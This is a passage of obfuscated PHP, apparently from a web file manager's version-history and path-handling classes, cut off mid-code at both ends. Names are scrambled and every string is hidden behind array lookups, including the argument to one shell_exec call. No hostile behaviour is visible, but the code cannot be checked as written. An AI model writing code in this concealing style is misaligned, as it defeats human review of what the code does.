(!$ÑÛÇæ¼) { return !1; } foreach ($ÑÛÇæ¼[$äşÑ·ãº[407]] as $æšûªšæ) { IO::remove($ÑÛÇæ¼[$äşÑ·ãº[1268]] . $æšûªšæ[$äşÑ·ãº[42]]); } return self::saveData($ÑÛÇæ¼[$äşÑ·ãº[1269]], array()); } public static function moveHistory($…ê­è¤®, $ùØ°·”Ù = '', $¾êºØ®Û = '') { $—Ø’â‘ =& $_SERVER[ªÏ§Ë·]; $Œ¸¿ÈÖˆ = self::listData($…ê­è¤®, !1); if (!$Œ¸¿ÈÖˆ || !$Œ¸¿ÈÖˆ[$—Ø’â‘[407]]) { return !1; } $˜ŸêÃ = $—Ø’â‘[1256]; $ùØ°·”Ù = $ùØ°·”Ù ? $ùØ°·”Ù : get_path_this($…ê­è¤®); $¾êºØ®Û = $¾êºØ®Û ? $¾êºØ®Û : $Œ¸¿ÈÖˆ[$—Ø’â‘[1268]]; $ªƒø¸¯Ú = substr(get_path_this($Œ¸¿ÈÖˆ[$—Ø’â‘[1269]]), 0, -strlen($˜ŸêÃ)); foreach ($Œ¸¿ÈÖˆ[$—Ø’â‘[407]] as $üé´üå¡ => $§¾¹ˆ•¬) { $ç­À¤Áâ = $ùØ°·”Ù . substr($§¾¹ˆ•¬[$—Ø’â‘[42]], strlen($ªƒø¸¯Ú)); $¨¯ØÏ¯Á = IO::move($Œ¸¿ÈÖˆ[$—Ø’â‘[1268]] . $§¾¹ˆ•¬[$—Ø’â‘[42]], $¾êºØ®Û, !1, $ç­À¤Áâ); if ($¨¯ØÏ¯Á) { $Œ¸¿ÈÖˆ[$—Ø’â‘[407]][$üé´üå¡][$—Ø’â‘[42]] = $ç­À¤Áâ; } } $Œ¸¿ÈÖˆ[$—Ø’â‘[1269]] = IO::move($Œ¸¿ÈÖˆ[$—Ø’â‘[1269]], $¾êºØ®Û, !1, $ùØ°·”Ù . $˜ŸêÃ); self::saveData($Œ¸¿ÈÖˆ[$—Ø’â‘[1269]], $Œ¸¿ÈÖˆ[$—Ø’â‘[407]]); self::clearEmptyFolder($Œ¸¿ÈÖˆ[$—Ø’â‘[1268]]); } public static function rollback($Ö² ÷ª‰, $°¥ŒÜÏ¾) { $—¦Ëı¾İ =& $_SERVER[ªÏ§Ë·]; $²áŸ’ = self::listData($Ö² ÷ª‰); if (!$²áŸ’) { return; } $úé–Œê‘ = IO::info($Ö² ÷ª‰); foreach ($²áŸ’[$—¦Ëı¾İ[407]] as $‹Ö›Ã€û => $¶âùÇá) { if ($¶âùÇá[$—¦Ëı¾İ[437]] == $°¥ŒÜÏ¾) { self::add($Ö² ÷ª‰); $È¬ÕÍıó = $²áŸ’[$—¦Ëı¾İ[1268]] . $¶âùÇá[$—¦Ëı¾İ[42]]; $¾ª½’ßŠ = IO::copy($È¬ÕÍıó, IO::pathFather($Ö² ÷ª‰), REPEAT_REPLACE, $úé–Œê‘[$—¦Ëı¾İ[42]]); if ($¾ª½’ßŠ) { self::remove($Ö² ÷ª‰, $°¥ŒÜÏ¾); } return $¾ª½’ßŠ; } } return !1; } public static function setDetail($İóêÉç†, $Ö«–Á´Ì, $±úÑä) { $ŒäÖø¸  =& $_SERVER[ªÏ§Ë·]; $Œ´¨úºõ = self::listData($İóêÉç†); if (!$Œ´¨úºõ) { return; } foreach ($Œ´¨úºõ[$ŒäÖø¸ [407]] as $­ØÄ„ıÃ => $Ò×ÄÖ›§) { if ($Ò×ÄÖ›§[$ŒäÖø¸ [437]] == $Ö«–Á´Ì) { $Œ´¨úºõ[$ŒäÖø¸ [407]][$­ØÄ„ıÃ][$ŒäÖø¸ [1267]] = $±úÑä; self::saveData($Œ´¨úºõ[$ŒäÖø¸ [1269]], $Œ´¨úºõ[$ŒäÖø¸ [407]]); return !0; } } return !1; } public static function fileInfo($ğ¥ªĞÎ, $ˆ‚¼®¬) { $¦šºÄ¯ =& $_SERVER[ªÏ§Ë·]; $¨‚“‹— = self::listData($ğ¥ªĞÎ); if (!$¨‚“‹—) { show_json(LNG($¦šºÄ¯[115]), !1); } $ªŸû‘ĞÖ = $¦šºÄ¯[12]; foreach ($¨‚“‹—[$¦šºÄ¯[407]] as $ÌïŠÇÕ => $‘Äæ ) { if ($‘Äæ [$¦šºÄ¯[437]] != $ˆ‚¼®¬) { continue; } $ªŸû‘ĞÖ = $¨‚“‹—[$¦šºÄ¯[1268]] . $‘Äæ [$¦šºÄ¯[42]]; break; } if (!$ªŸû‘ĞÖ) { show_json(LNG($¦šºÄ¯[115]), !1); } return IO::info($ªŸû‘ĞÖ); } public static function fileOut($¹ª¡Åäƒ, $ÕÂ¼˜Åã, $ïòôÕ±Ÿ = false) { $Óú’ºÏÕ =& $_SERVER[ªÏ§Ë·]; $€Šµ‚•ª = self::fileInfo($¹ª¡Åäƒ, $ÕÂ¼˜Åã); $»§š™¶ =& $GLOBALS[$Óú’ºÏÕ[7]]; $ïòôÕ±Ÿ = isset($»§š™¶[$Óú’ºÏÕ[1219]]) && $»§š™¶[$Óú’ºÏÕ[1219]] == 1; if (isset($»§š™¶[$Óú’ºÏÕ[43]]) && $»§š™¶[$Óú’ºÏÕ[43]] == $Óú’ºÏÕ[1270]) { return IO::fileOutImage($€Šµ‚•ª[$Óú’ºÏÕ[94]], $»§š™¶[$Óú’ºÏÕ[1271]]); } IO::fileOut($€Šµ‚•ª[$Óú’ºÏÕ[94]], $ïòôÕ±Ÿ, get_path_this($¹ª¡Åäƒ)); } public static function listData($½úû°‰Ë, $„‘Ä·µí = true) { $ÔÊÁ”²À =& $_SERVER[ªÏ§Ë·]; if ($„‘Ä·µí && !IO::exist($½úû°‰Ë)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($½úû°‰Ë, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¥‚ìèœŠ = self::pathHistory($½úû°‰Ë); $çÇÔ¬ô° = array($ÔÊÁ”²À[1269] => $¥‚ìèœŠ . $ÔÊÁ”²À[1256], $ÔÊÁ”²À[1268] => rtrim(get_path_father($¥‚ìèœŠ), $ÔÊÁ”²À[8]) . $ÔÊÁ”²À[8], $ÔÊÁ”²À[407] => array()); $úä¦€˜æ = IO::getContent($çÇÔ¬ô°[$ÔÊÁ”²À[1269]]); if ($úä¦€˜æ) { $ÈóÚã×Ó = json_decode($úä¦€˜æ, !0); if (is_array($ÈóÚã×Ó)) { $çÇÔ¬ô°[$ÔÊÁ”²À[407]] = $ÈóÚã×Ó; } } return $çÇÔ¬ô°; } private static function saveData($â¨Ë¦ûà, $À¢€•„û) { $˜ıîª¹î =& $_SERVER[ªÏ§Ë·]; self::log($˜ıîª¹î[1272] . $â¨Ë¦ûà . $˜ıîª¹î[81] . count($À¢€•„û), $˜ıîª¹î[779]); if ($À¢€•„û) { return IO::setContent($â¨Ë¦ûà, json_encode($À¢€•„û)); } $êÚ±²Í» = IO::pathFather($â¨Ë¦ûà); IO::remove($â¨Ë¦ûà); self::clearEmptyFolder($êÚ±²Í»); return !0; } public static function clearEmptyFolder($È÷è•Œñ) { $ô¢¥‚’ =& $_SERVER[ªÏ§Ë·]; if (trim($È÷è•Œñ, $ô¢¥‚’[8]) == trim(self::$_historyBase, $ô¢¥‚’[8])) { return; } $Ğ¨¨åáÁ = IO::pathFather($È÷è•Œñ); $Ï¾ªÓÃ = IO::has($È÷è•Œñ, !0); if ($Ï¾ªÓÃ[$ô¢¥‚’[217]] > 0 || $Ï¾ªÓÃ[$ô¢¥‚’[218]] > 0) { return; } IO::remove($È÷è•Œñ); self::clearEmptyFolder($Ğ¨¨åáÁ); } private static function getBasePath() { $ı£‰ƒÑ =& $_SERVER[ªÏ§Ë·]; $Ñ¸€¡é¼ = Model($ı£‰ƒÑ[1273])->get($ı£‰ƒÑ[1274]); if ($Ñ¸€¡é¼) { if (!IO::exist($Ñ¸€¡é¼)) { IO::mkdir($Ñ¸€¡é¼); } if (get_path_this($Ñ¸€¡é¼) == $ı£‰ƒÑ[1259]) { $ÀéÏ±Øö = $ı£‰ƒÑ[1275] . rand_string(8); @rename($Ñ¸€¡é¼, get_path_father($Ñ¸€¡é¼) . $ı£‰ƒÑ[8] . $ÀéÏ±Øö); $Ñ¸€¡é¼ = DATA_PATH . $ÀéÏ±Øö . $ı£‰ƒÑ[8]; file_put_contents(DATA_PATH . $ı£‰ƒÑ[1209], $ı£‰ƒÑ[12]); Model($ı£‰ƒÑ[1273])->set($ı£‰ƒÑ[1274], $Ñ¸€¡é¼); } return $Ñ¸€¡é¼; } $Ñ¸€¡é¼ = DATA_PATH . $ı£‰ƒÑ[1275] . rand_string(8) . $ı£‰ƒÑ[8]; $Ñ¸€¡é¼ = IO::mkdir($Ñ¸€¡é¼); $Ñ¸€¡é¼ = rtrim($Ñ¸€¡é¼, $ı£‰ƒÑ[8]) . $ı£‰ƒÑ[8]; file_put_contents($Ñ¸€¡é¼ . $ı£‰ƒÑ[1209], $ı£‰ƒÑ[12]); file_put_contents(DATA_PATH . $ı£‰ƒÑ[1209], $ı£‰ƒÑ[12]); Model($ı£‰ƒÑ[1273])->set($ı£‰ƒÑ[1274], $Ñ¸€¡é¼); return $Ñ¸€¡é¼; } } class KodIO { const KOD_SOURCE = "\x7b\163\x6f\x75\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\x72\122\x65\x63\x79\x63\x6c\x65\175"; const KOD_USER_FAV = "\x7b\165\x73\145\x72\106\x61\166\x7d"; const KOD_USER_FILE_TAG = "\173\x75\x73\x65\x72\106\151\x6c\145\x54\x61\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\145\162\106\151\154\x65\x54\x79\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\157\x75\160\122\x6f\157\x74\123\x65\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\145\x72\x53\x68\x61\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\x73\145\162\123\x68\141\162\145\x4c\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\141\x72\145\124\157\115\x65\175"; const KOD_SHARE_ITEM = "\173\x73\x68\x61\162\x65\111\164\145\155\x7d"; const KOD_SHARE_LINK = "\x7b\x73\150\141\162\x65\x49\x74\145\155\x4c\151\x6e\x6b\175"; const KOD_SEARCH = "\x7b\x73\x65\x61\162\x63\x68\175"; const KOD_BLOCK = "\x7b\142\x6c\157\x63\153\175"; const KOD_IO = "\x7b\x69\157\x7d"; const KOD_USER_RECENT = "\173\165\163\x65\x72\122\145\156\143\x65\x6e\x74\175"; const KOD_USER_DRIVER = "\x7b\144\162\x69\166\145\x72\x7d"; public static function typeList() { $ï‘ìÖ£Æ =& $_SERVER[ªÏ§Ë·]; return array($ï‘ìÖ£Æ[1276] => self::KOD_SOURCE, $ï‘ìÖ£Æ[1277] => self::KOD_USER_RECYCLE, $ï‘ìÖ£Æ[1278] => self::KOD_USER_FAV, $ï‘ìÖ£Æ[1279] => self::KOD_USER_FILE_TAG, $ï‘ìÖ£Æ[1280] => self::KOD_USER_FILE_TYPE, $ï‘ìÖ£Æ[1281] => self::KOD_GROUP_ROOT_SELF, $ï‘ìÖ£Æ[1282] => self::KOD_USER_SHARE, $ï‘ìÖ£Æ[1283] => self::KOD_USER_SHARE_LINK, $ï‘ìÖ£Æ[1284] => self::KOD_USER_SHARE_TO_ME, $ï‘ìÖ£Æ[1285] => self::KOD_SHARE_ITEM, $ï‘ìÖ£Æ[1286] => self::KOD_SHARE_LINK, $ï‘ìÖ£Æ[1287] => self::KOD_SEARCH, $ï‘ìÖ£Æ[1288] => self::KOD_BLOCK, $ï‘ìÖ£Æ[1289] => self::KOD_IO, $ï‘ìÖ£Æ[1290] => self::KOD_USER_RECENT, $ï‘ìÖ£Æ[1291] => self::KOD_USER_DRIVER); } public static function parse($×øÁîÀ) { $Ï‰¥Õâ‘ =& $_SERVER[ªÏ§Ë·]; $×øÁîÀ = self::clear($×øÁîÀ); $«×òØîş = array_values(self::typeList()); preg_match($Ï‰¥Õâ‘[1292], $×øÁîÀ, $ÂÁıª’Â); $å¬Ñ’½“ = array($Ï‰¥Õâ‘[460] => !1, $Ï‰¥Õâ‘[1293] => !1, $Ï‰¥Õâ‘[457] => !1, $Ï‰¥Õâ‘[94] => $×øÁîÀ, $Ï‰¥Õâ‘[1194] => !1, $Ï‰¥Õâ‘[1193] => $Ï‰¥Õâ‘[12]); if (is_array($ÂÁıª’Â) && count($ÂÁıª’Â) == 5) { $©ö‰×ÑÌ = $Ï‰¥Õâ‘[1294] . $ÂÁıª’Â[2] . $Ï‰¥Õâ‘[365]; if (in_array($©ö‰×ÑÌ, $«×òØîş)) { $å¬Ñ’½“[$Ï‰¥Õâ‘[1194]] = $ÂÁıª’Â[1]; $å¬Ñ’½“[$Ï‰¥Õâ‘[43]] = $©ö‰×ÑÌ; $å¬Ñ’½“[$Ï‰¥Õâ‘[1295]] = substr($©ö‰×ÑÌ, 1, -1); $å¬Ñ’½“[$Ï‰¥Õâ‘[437]] = $ÂÁıª’Â[3]; } $å¬Ñ’½“[$Ï‰¥Õâ‘[1193]] = $ÂÁıª’Â[4]; } $Ô¨’ÎÑ = array($Ï‰¥Õâ‘[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $å¬Ñ’½“[$Ï‰¥Õâ‘[1258]] = in_array($å¬Ñ’½“[$Ï‰¥Õâ‘[43]], $Ô¨’ÎÑ); return $å¬Ñ’½“; } public static function isTruePath($‹Û­õÀñ) { $ØæÂ×¼ =& $_SERVER[ªÏ§Ë·]; if (substr($‹Û­õÀñ, 0, 1) != $ØæÂ×¼[1294]) { return !0; } if (strpos($‹Û­õÀñ, $ØæÂ×¼[446]) === 0) { return !0; } if (strpos($‹Û­õÀñ, $ØæÂ×¼[1262]) === 0) { return !0; } if (strpos($‹Û­õÀñ, $ØæÂ×¼[1296]) === 0) { return !0; } if (strpos($‹Û­õÀñ, $ØæÂ×¼[1297]) === 0) { return !0; } if (strpos($‹Û­õÀñ, $ØæÂ×¼[1298]) === 0) { return !0; } return !1; } public static function clear($ğŸ¸İ‡è) { $šƒ›À³Ø =& $_SERVER[ªÏ§Ë·]; $ğŸ¸İ‡è = str_replace(array($šƒ›À³Ø[1103], $šƒ›À³Ø[19]), $šƒ›À³Ø[63], $ğŸ¸İ‡è); $ğŸ¸İ‡è = str_replace($šƒ›À³Ø[107], $šƒ›À³Ø[8], $ğŸ¸İ‡è); $²ùâ¸Ñ„ = $šƒ›À³Ø[1299]; if (substr($ğŸ¸İ‡è, 0, 3) == $šƒ›À³Ø[1300]) { $ğŸ¸İ‡è = substr($ğŸ¸İ‡è, 3); } while (strstr($ğŸ¸İ‡è, $²ùâ¸Ñ„)) { $ğŸ¸İ‡è = str_replace($²ùâ¸Ñ„, $šƒ›À³Ø[8], $ğŸ¸İ‡è); } $ğŸ¸İ‡è = preg_replace($šƒ›À³Ø[1301], $šƒ›À³Ø[8], $ğŸ¸İ‡è); if ($ğŸ¸İ‡è == $šƒ›À³Ø[8]) { return $šƒ›À³Ø[8]; } $ğŸ¸İ‡è = rtrim($ğŸ¸İ‡è, $šƒ›À³Ø[8]); return $ğŸ¸İ‡è; } public static function pathTrue($ˆ¥”Üï´) { $Ò€ª„ÏŒ =& $_SERVER[ªÏ§Ë·]; if (!$ˆ¥”Üï´) { return $Ò€ª„ÏŒ[12]; } $ëÇ«¹—Á = strlen($ˆ¥”Üï´); if (substr($ˆ¥”Üï´, $ëÇ«¹—Á - 1, 1) == $Ò€ª„ÏŒ[8]) { $ˆ¥”Üï´ = substr($ˆ¥”Üï´, 0, $ëÇ«¹—Á - 1); } $ˆ¥”Üï´ = str_replace($Ò€ª„ÏŒ[557], $Ò€ª„ÏŒ[8], str_replace($Ò€ª„ÏŒ[1302], $Ò€ª„ÏŒ[8], $ˆ¥”Üï´)); if (substr($ˆ¥”Üï´, 0, 2) == $Ò€ª„ÏŒ[1303]) { $ˆ¥”Üï´ = substr($ˆ¥”Üï´, 2); } if (!strstr($ˆ¥”Üï´, $Ò€ª„ÏŒ[1300])) { return $ˆ¥”Üï´; } $‘¡ìş… = explode($Ò€ª„ÏŒ[8], $ˆ¥”Üï´); $­ÆçØÌ = array_search($Ò€ª„ÏŒ[1304], $‘¡ìş…); if ($­ÆçØÌ >= 0) { $‘¡ìş…[$­ÆçØÌ] = -1; } if ($­ÆçØÌ > 0) { $‘¡ìş…[$­ÆçØÌ - 1] = -1; } $òê´×‘¹ = array(); foreach ($‘¡ìş… as $°Ûºü¾) { if ($°Ûºü¾ !== -1) { $òê´×‘¹[] = $°Ûºü¾; } } return self::pathTrue(implode($Ò€ª„ÏŒ[8], $òê´×‘¹)); } public static function sourceID($ãÏîÒø) { $ëı¿ûÒô =& $_SERVER[ªÏ§Ë·]; $¥À…éä¹ = self::parse($ãÏîÒø); if ($¥À…éä¹[$ëı¿ûÒô[43]] !== self::KOD_SOURCE) { show_json(LNG($ëı¿ûÒô[1305]), !1); } return $¥À…éä¹[$ëı¿ûÒô[437]]; } public static function make($İ ¡Ó÷ô) { if (!$İ ¡Ó÷ô) { return !1; } return self::makePath(self::KOD_SOURCE, intval($İ ¡Ó÷ô)); } public static function makeShare($¤™úÂ¡À, $Ã¼ïª·ü) { return self::makePath(self::KOD_SHARE_ITEM, $¤™úÂ¡À, $Ã¼ïª·ü); } public static function makeFileTypePath($šÌŠÈÚ) { return self::makePath(self::KOD_USER_FILE_TYPE, $šÌŠÈÚ); } public static function makeFileTagPath($‡ïêÊ) { return self::makePath(self::KOD_USER_FILE_TAG, $‡ïêÊ); } public static function makePath($ù¯ƒ€©, $şçÂ›ê­ = '', $Œ²ÑÒ ú = '') { $ÛñÒğÂâ =& $_SERVER[ªÏ§Ë·]; $¿°¹ªÊ = substr($ù¯ƒ€©, 1, -1); $è¤§¦ğ´ = $ÛñÒğÂâ[1306] . $¿°¹ªÊ . $ÛñÒğÂâ[1307] . $şçÂ›ê­ . $ÛñÒğÂâ[1308]; $è¤§¦ğ´ = $Œ²ÑÒ ú ? $è¤§¦ğ´ . $Œ²ÑÒ ú . $ÛñÒğÂâ[8] : $è¤§¦ğ´; return $è¤§¦ğ´; } public static function hashPath($Æ•ø¨Àí, $ÌÓõÆ×ó = true) { $Í¼åŠÌ =& $_SERVER[ªÏ§Ë·]; $š¢ù¹˜Æ = is_array($Æ•ø¨Àí) ? $Æ•ø¨Àí : IO::info($Æ•ø¨Àí); $˜ÀÌı€› = _get($š¢ù¹˜Æ, $Í¼åŠÌ[1309], $Í¼åŠÌ[12]); if (!$˜ÀÌı€› && isset($š¢ù¹˜Æ[$Í¼åŠÌ[440]])) { $š¢ù¹˜Æ = IO::info(KodIO::make($š¢ù¹˜Æ[$Í¼åŠÌ[440]])); $˜ÀÌı€› = _get($š¢ù¹˜Æ, $Í¼åŠÌ[1309], $Í¼åŠÌ[12]); } if (!$˜ÀÌı€› && $ÌÓõÆ×ó) { $‡ÛÊÆŒÊ = KodIO::parse($š¢ù¹˜Æ[$Í¼åŠÌ[94]]); if (!$‡ÛÊÆŒÊ[$Í¼åŠÌ[43]]) { $˜ÀÌı€› = IO::hashSimple($š¢ù¹˜Æ[$Í¼åŠÌ[94]]); } } if (!$˜ÀÌı€›) { $˜ÀÌı€› = md5($š¢ù¹˜Æ[$Í¼åŠÌ[94]] . $š¢ù¹˜Æ[$Í¼åŠÌ[86]] . $š¢ù¹˜Æ[$Í¼åŠÌ[95]]); } return $˜ÀÌı€›; } public static function hashPathSafe($†ÕîÉ…µ, $«ò¾Òêû = true) { $Ò‚›êöğ =& $_SERVER[ªÏ§Ë·]; $Î»¹ƒ = self::hashPath($†ÕîÉ…µ, $«ò¾Òêû); return md5($Î»¹ƒ . $Ò‚›êöğ[1310] . Model($Ò‚›êöğ[798])->get($Ò‚›êöğ[799])); } public static function initSystemPath() { $ €¦áïõ =& $_SERVER[ªÏ§Ë·]; if (defined($ €¦áïõ[1311])) { return; } define($ €¦áïõ[1311], self::systemPath($ €¦áïõ[1312])); define($ €¦áïõ[1313], self::systemPath($ €¦áïõ[1314])); define($ €¦áïõ[1315], self::systemPath($ €¦áïõ[1316])); define($ €¦áïõ[1317], self::systemPath($ €¦áïõ[1318])); IOHistory::bindEvent(); } public static function systemPath($òô“²ŸÁ) { $ŞÇˆ…Œ =& $_SERVER[ªÏ§Ë·]; $¶è·Úè = $ŞÇˆ…Œ[1319] . ucfirst($òô“²ŸÁ); $õš¸Æø— = Model($ŞÇˆ…Œ[798])->get($¶è·Úè); if ($õš¸Æø—) { return $õš¸Æø—; } if ($òô“²ŸÁ == $ŞÇˆ…Œ[1312]) { $õš¸Æø— = self::make(Model($ŞÇˆ…Œ[853])->systemRootPathAdd($ŞÇˆ…Œ[572])); } else { $õš¸Æø— = self::systemPath($ŞÇˆ…Œ[1312]); $¾ÇÆ‘£â = self::sourceID($õš¸Æø—); $õš¸Æø— = self::make(Model($ŞÇˆ…Œ[853])->mkdir($¾ÇÆ‘£â, $òô“²ŸÁ)); } Model($ŞÇˆ…Œ[798])->set($¶è·Úè, $õš¸Æø—); return $õš¸Æø—; } public static function systemFolder($ºóÊ” ) { $ÜË¯ÈÇ® = IO_PATH_SYSTEM_SOURCE . $ºóÊ” ; $Çì©ÃòÅ = Cache::get($ÜË¯ÈÇ®); if (!$Çì©ÃòÅ) { $Éò¿Èã„ = IO::infoFull($ÜË¯ÈÇ®); if (!$Éò¿Èã„) { $Çì©ÃòÅ = IO::mkdir($ÜË¯ÈÇ®, REPEAT_SKIP); } else { $Çì©ÃòÅ = $Éò¿Èã„[$_SERVER[ªÏ§Ë·][94]]; } Cache::set($ÜË¯ÈÇ®, $Çì©ÃòÅ, 3600 * 10); } return $Çì©ÃòÅ; } public static function defaultDriver() { return Model($_SERVER[ªÏ§Ë·][795])->defaultDriver(); } public static function defaultIO() { $ó¢š¡Æß =& $_SERVER[ªÏ§Ë·]; $É»¶ì‚Ì = self::defaultDriver(); return $ó¢š¡Æß[1320] . $É»¶ì‚Ì[$ó¢š¡Æß[437]] . $ó¢š¡Æß[1308]; } public static function defaultDriverInit() { static $õ÷¬ı• = false; if ($õ÷¬ı•) { return $õ÷¬ı•; } $õ÷¬ı• = IO::init(self::defaultIO()); return $õ÷¬ı•; } public static function fileTypeList() { $Æ˜«¹Ö =& $_SERVER[ªÏ§Ë·]; $İŒÂ¾Ùè = $GLOBALS[$Æ˜«¹Ö[6]][$Æ˜«¹Ö[1321]]; foreach ($İŒÂ¾Ùè as $Ùù¼Õ¥Å => $ı–¸Ì”µ) { $öÇ—ìÎ¥ = $Æ˜«¹Ö[1322] . $Ùù¼Õ¥Å; $¯õ€•ú£ = LNG($öÇ—ìÎ¥); if ($öÇ—ìÎ¥ != $¯õ€•ú£) { $İŒÂ¾Ùè[$Ùù¼Õ¥Å][$Æ˜«¹Ö[42]] = $¯õ€•ú£; } } return $İŒÂ¾Ùè; } public static function diskList($ãÏÀ“İÂ = true) { $å„ª¡ê— = $_SERVER[ªÏ§Ë·][1323]; if ($ãÏÀ“İÂ) { $“–Ÿ‹Ğ¯ = Cache::get($å„ª¡ê—); if (is_array($“–Ÿ‹Ğ¯)) { return $“–Ÿ‹Ğ¯; } } $“–Ÿ‹Ğ¯ = self::diskListGet(); Cache::set($å„ª¡ê—, $“–Ÿ‹Ğ¯, 60); return $“–Ÿ‹Ğ¯; } public static function diskListGet() { $ æãëøÚ =& $_SERVER[ªÏ§Ë·]; $„€ä¯³ó = array(); if ($GLOBALS[$ æãëøÚ[6]][$ æãëøÚ[1324]] == $ æãëøÚ[1325]) { $•ó§‹ˆ· = $ æãëøÚ[1326]; for ($™±ŠÅÄ = 0; $™±ŠÅÄ < strlen($•ó§‹ˆ·); $™±ŠÅÄ++) { $ËùÜı×° = $•ó§‹ˆ·[$™±ŠÅÄ] . $ æãëøÚ[1327]; if (file_exists($ËùÜı×°)) { $„€ä¯³ó[] = $ËùÜı×°; } } return $„€ä¯³ó; } if (!function_exists($ æãëøÚ[108])) { $„€ä¯³ó[] = $ æãëøÚ[863]; return $„€ä¯³ó; } $ĞÍÜÜ« = explode($ æãëøÚ[19], shell_exec($ æãëøÚ[1328])); array_shift($ĞÍÜÜ«); array_pop($ĞÍÜÜ«); $«’¬¨¦ = array($ æãëøÚ[1329], $ æãëøÚ[1330], $ æãëøÚ[1331], $ æãëøÚ[1332], $ æãëøÚ[1333], $ æãëøÚ[1334], $ æãëøÚ[1335], $ æãëøÚ[1336]); foreach ($ĞÍÜÜ« as $ŞÅàÏ†½) { $£ÜØĞè = preg_split($ æãëøÚ[1337], $ŞÅàÏ†½); $ËùÜı×° = $£ÜØĞè[count($£ÜØĞè) - 1]; if (!strstr($£ÜØĞè[0], $ æãëøÚ[1338]) || !$ËùÜı×°) { continue; } $ÛÓáïŠ = rtrim($ËùÜı×°, $ æãëøÚ[8]) . $ æãëøÚ[8]; if (in_array($ÛÓáïŠ, $«’¬¨¦)) { continue; } $„€ä¯³ó[] = $ÛÓáïŠ; } return $„€ä¯³ó; } public static function isSameDisk($û¹Üş‰ú, $ÑÙşŞºâ) { $Ë­¼öÑ =& $_SERVER[ªÏ§Ë·]; if ($GLOBALS[$Ë­¼öÑ[6]][$Ë­¼öÑ[1324]] == $Ë­¼öÑ[1325]) { return strtolower(substr($û¹Üş‰ú, 0, 1)) == strtolower(substr($ÑÙşŞºâ, 0, 1)); } $†‚›Ùƒ = self::diskList(); $²­Ù¨ÁÙ = !1; $¨ú´€”Û = !1; sort($†‚›Ùƒ); $†‚›Ùƒ = array_reverse($†‚›Ùƒ); $û¹Üş‰ú = rtrim($û¹Üş‰ú, $Ë­¼öÑ[8]) . $Ë­¼öÑ[8]; $ÑÙşŞºâ = rtrim($ÑÙşŞºâ, $Ë­¼öÑ[8]) . $Ë­¼öÑ[8]; foreach ($†‚›Ùƒ as $»¬£ô†æ) { $’¿“ÚİØ = strlen($»¬£ô†æ); if (!$²­Ù¨ÁÙ && substr($û¹Üş‰ú, 0, $’¿“ÚİØ) == $»¬£ô†æ) { $²­Ù¨ÁÙ = $»¬£ô†æ; } if (!$¨ú´€”Û && substr($ÑÙşŞºâ, 0, $’¿“ÚİØ) == $»¬£ô†æ) { $¨ú´€”Û = $»¬£ô†æ; } if ($²­Ù¨ÁÙ && $¨ú´€”Û) { break; } } return $²­Ù¨ÁÙ === $¨ú´€”Û; } public static function transferType($µ¬÷ï©¡, $Ôé•–×) { $¬Õ˜™ºÈ =& $_SERVER[ªÏ§Ë·]; $ıûåúä© = self::driverType($µ¬÷ï©¡); $ÚÑÂ²³ = self::driverType($Ôé•–×); if ($ıûåúä©[$¬Õ˜™ºÈ[43]] == $ÚÑÂ²³[$¬Õ˜™ºÈ[43]] && $ıûåúä©[$¬Õ˜™ºÈ[1339]] == $ÚÑÂ²³[$¬Õ˜™ºÈ[1339]]) { return $¬Õ˜™ºÈ[1340]; } if ($ıûåúä©[$¬Õ˜™ºÈ[43]] == $¬Õ˜™ºÈ[896] && $ÚÑÂ²³[$¬Õ˜™ºÈ[43]] == $¬Õ˜™ºÈ[116]) { return $¬Õ˜™ºÈ[1219]; } if ($ıûåúä©[$¬Õ˜™ºÈ[43]] == $¬Õ˜™ºÈ[116] && $ÚÑÂ²³[$¬Õ˜™ºÈ[43]] == $¬Õ˜™ºÈ[896]) { return $¬Õ˜™ºÈ[117]; } return $¬Õ˜™ºÈ[1341]; } public static function driverType($Ê¾šéçØ) { $™Åğ¼¯¦ =& $_SERVER[ªÏ§Ë·]; $é€Ø•Î» = str_replace($™Åğ¼¯¦[1342], $™Åğ¼¯¦[12], strtolower($Ê¾šéçØ->getType())); if ($é€Ø•Î» == $™Åğ¼¯¦[785] || $é€Ø•Î» == $™Åğ¼¯¦[1343] || $é€Ø•Î» == $™Åğ¼¯¦[1344]) { $Ê¾šéçØ = self::defaultDriverInit(); } else { if ($é€Ø•Î» == $™Åğ¼¯¦[1229] || $é€Ø•Î» == $™Åğ¼¯¦[1345]) { $Ê¾šéçØ = IO::init($Ê¾šéçØ->pathParse[$™Åğ¼¯¦[1176]]); } } $Á©¡ë¶õ = $Ê¾šéçØ->path; $é€Ø•Î» = str_replace($™Åğ¼¯¦[1342], $™Åğ¼¯¦[12], strtolower($Ê¾šéçØ->getType())); if ($é€Ø•Î» == $™Åğ¼¯¦[116]) { return array($™Åğ¼¯¦[43] => $™Åğ¼¯¦[116], $™Åğ¼¯¦[1339] => $™Åğ¼¯¦[12], $™Åğ¼¯¦[94] => $Á©¡ë¶õ, $™Åğ¼¯¦[105] => $Ê¾šéçØ); } return array($™Åğ¼¯¦[43] => $™Åğ¼¯¦[896], $™Åğ¼¯¦[1339] => $Ê¾šéçØ->pathDriver, $™Åğ¼¯¦[94] => $Á©¡ë¶õ, $™Åğ¼¯¦[105] => $Ê¾šéçØ); } public static function pathDriverType($¸‰¦ÆÅ¼) { return $¸‰¦ÆÅ¼ ? self::driverType(IO::init($¸‰¦ÆÅ¼)) : !1; } public static function pathDriverLocal($‹Â¼÷) { $÷ÌŠÆÎ¦ =& $_SERVER[ªÏ§Ë·]; $ÙÅğ”§• = $‹Â¼÷ ? self::driverType(IO::init($‹Â¼÷)) : !1; return $ÙÅğ”§•[$÷ÌŠÆÎ¦[43]] == $÷ÌŠÆÎ¦[116] ? !0 : !1; } public static function allowCover($öš‘ÙŠİ, $‹¯È÷í = true) { $İÔÔ ‡ =& $_SERVER[ªÏ§Ë·]; if (is_string($öš‘ÙŠİ)) { $öš‘ÙŠİ = IO::info($öš‘ÙŠİ); } if (!$öš‘ÙŠİ || 